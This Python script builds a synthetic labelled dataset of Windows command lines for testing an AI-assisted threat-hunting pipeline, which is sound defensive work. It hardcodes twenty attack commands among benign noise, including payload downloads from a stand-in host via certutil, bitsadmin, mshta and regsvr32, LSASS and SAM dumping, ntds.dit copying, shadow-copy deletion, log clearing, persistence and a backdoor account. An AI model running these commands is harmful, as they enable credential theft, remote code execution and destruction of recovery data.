"""Generate an EVASIVE synthetic dataset for demoing the AI HUNT path.

20 malicious commands, split into two groups:
  * ~12 that the deterministic engine catches via its pattern table.
  * ~8 "stealthy" ones using LOLBins / techniques NOT in the pattern table
    (esentutl NTDS copy, sc-create service persistence, mshta/regsvr32 proxy
    execution, findstr password harvesting, remote wmic, legacy at, nltest).

Because the deterministic pass finds < 20, the pipeline enters HUNT mode and
(with an API key set) the AI reviews all 220 rows to recover the missed ones.

Usage: python3 tools/make_evasive.py [output.csv]
"""
import csv
import os
import random
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from make_synthetic import benign_command  # reuse the benign noise generator

# Caught by the deterministic pattern table:
DETECTED = [
    ("powershell.exe", "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3ACkA"),
    ("reg.exe", "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save"),
    ("certutil.exe", "certutil -urlcache -f http://203.0.113.9/t.exe C:\\Windows\\Temp\\t.exe"),
    ("cmd.exe", "C:\\Temp\\m.exe sekurlsa::logonpasswords"),
    ("vssadmin.exe", "vssadmin delete shadows /all /quiet"),
    ("wevtutil.exe", "wevtutil cl Security"),
    ("cmd.exe", "schtasks /create /tn \"Sync\" /tr C:\\Windows\\Temp\\u.ps1 /sc onlogon"),
    ("reg.exe", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Sync /d C:\\Windows\\Temp\\u.ps1 /f"),
    ("bitsadmin.exe", "bitsadmin /transfer j http://203.0.113.9/p.exe C:\\Windows\\Temp\\p.exe"),
    ("procdump.exe", "procdump -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"),
    ("cmd.exe", "net user svc_helper P@ssw0rd /add"),
    ("cmd.exe", "copy C:\\Windows\\Temp\\sam.save \\\\fileserver\\exfil\\sam.save"),
]

# Stealthy — NOT in the pattern table; the AI HUNT must recover these:
STEALTHY = [
    ("esentutl.exe", "esentutl.exe /y C:\\Windows\\NTDS\\ntds.dit /vss /d C:\\Windows\\Temp\\ntds.dit"),
    ("sc.exe", "sc.exe create UpdaterSvc binPath= \"C:\\ProgramData\\u.bin\" start= auto"),
    ("mshta.exe", "mshta.exe http://203.0.113.9/a.hta"),
    ("regsvr32.exe", "regsvr32 /s /n /u /i:http://203.0.113.9/x.sct scrobj.dll"),
    ("findstr.exe", "findstr /si password C:\\Users\\alice\\*.config C:\\Users\\alice\\*.xml"),
    ("wmic.exe", "wmic /node:10.0.0.5 process call create \"cmd /c ipconfig /all\""),
    ("at.exe", "at \\\\fileserver 03:00 cmd /c C:\\ProgramData\\u.bin"),
    ("nltest.exe", "nltest /dclist:corp"),
]

ATTACK = DETECTED + STEALTHY  # 20 total


def generate(n_benign=200, seed=4242):
    rng = random.Random(seed)
    rows = [(p, c, "malicious") for p, c in ATTACK]
    for _ in range(n_benign):
        p, c = benign_command(rng)
        rows.append((p, c, "benign"))
    rng.shuffle(rows)
    return rows


def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "data/training/synthetic_evasive.csv"
    rows = generate()
    with open(out, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["process_name", "command_line", "label"])
        w.writerows(rows)
    mal = sum(1 for r in rows if r[2] == "malicious")
    print(f"Wrote {len(rows)} rows ({mal} malicious, {len(rows) - mal} benign) -> {out}")


if __name__ == "__main__":
    main()
